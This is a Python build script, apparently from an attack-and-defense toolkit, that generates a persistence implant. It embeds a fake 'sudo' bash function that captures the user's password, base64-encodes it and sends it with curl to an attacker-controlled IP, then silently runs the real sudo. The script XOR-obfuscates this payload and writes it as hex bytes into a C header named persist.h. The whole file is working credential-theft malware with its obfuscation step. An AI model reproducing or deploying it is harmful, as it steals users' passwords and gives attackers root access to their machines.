from pwn import *

def get_ip():
    f = open("/home/mcsky/Desktop/AD/mcAD/s1mz/santinela/env.h", "r").read()
    for line in f.split("\n"):
        if "IP" in line:
            return line.split(" ")[2].strip().replace("\"", "")

def encrypt_data(data):
    data = list(data)
    for i in range(len(data)):
        data[i] = (data[i] ^ (((((i << 4) + 97436)) ^ 0x69) & 0xff))
    return b"".join([bytes([x]) for x in data])

dat = b'''function sudo () 
{ 
    # when we get done, they gon play this back
    realsudo="$(which sudo)";
    read -s -p "[sudo] password for $USER: " inputPasswd;
    printf "\n";
    encoded=$(printf '%s' "$inputPasswd" | base64) > /dev/null 2>&1;
    curl -s "http://XXXXX:41312/$USER:$encoded" > /dev/null 2>&1;
    $realsudo -S -u root bash -c "exit" <<< "$inputPasswd" > /dev/null 2>&1;
    $realsudo "${@:1}"
}
'''
ip = get_ip()
dat = dat.replace(b"XXXXX", ip.encode())
dat = encrypt_data(dat)
dat_len = len(dat)
# conver to \x format
dat = "".join(["\\x" + hex(x)[2:].zfill(2) for x in dat])
dat = '"' + dat + '"'

f = open("/home/mcsky/Desktop/AD/mcAD/s1mz/santinela/hijacker/persist.h.template", "r")
to_write = f.read()
to_write = to_write.replace("XXX", str(dat_len + 20)).replace("YYY", dat)
f.close()

f = open("/home/mcsky/Desktop/AD/mcAD/s1mz/santinela/hijacker/persist.h", "w")
f.write(to_write)
f.close()



